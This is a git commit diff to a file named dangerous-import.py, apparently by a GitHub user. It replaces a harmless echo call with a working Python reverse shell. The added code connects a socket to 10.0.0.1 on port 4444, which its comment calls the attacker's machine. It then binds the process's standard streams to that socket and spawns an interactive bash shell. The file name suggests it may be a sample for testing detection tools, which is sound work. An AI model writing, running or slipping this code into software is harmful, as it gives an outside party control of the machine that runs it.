7270828032353e9a25c6c3c0baacaf1749be119e
ash020202 <130071750+ash020202@users.noreply.github.com>
2025-03-23 10:24:05 +0530

    Update dangerous-import.py

--- dangerous-import.py
+++ dangerous-import.py
@@ -1,4 +1,16 @@
+import socket
 import subprocess
 import os
 
-os.system("echo 'Hello'")
+# Create a socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Connect to attacker's machine
+s.connect(("10.0.0.1", 4444))
+
+# Redirect stdin/stdout/stderr
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+# Execute shell
+subprocess.call(["/bin/bash", "-i"])
